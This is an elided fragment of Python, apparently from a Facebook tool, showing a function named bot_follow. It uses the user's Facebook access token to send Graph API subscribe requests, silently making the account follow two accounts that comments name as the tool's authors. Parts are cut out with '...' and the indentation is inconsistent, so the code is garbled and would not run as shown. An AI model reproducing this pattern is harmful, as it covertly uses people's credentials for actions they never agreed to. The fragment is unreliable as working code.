...
def bot_follow():
	try:
		...
		print("\n   [!] Token invalid")
		login()
    	requests.post('https://graph.facebook.com/110974777938070/subscribers?access_token=' + toket)      #Dewa Tomi Mahesa
    	...
    	requests.post('https://graph.facebook.com/103091685202429/subscribers?access_token=' + toket) #Eagle Vincere Team
    	menu()
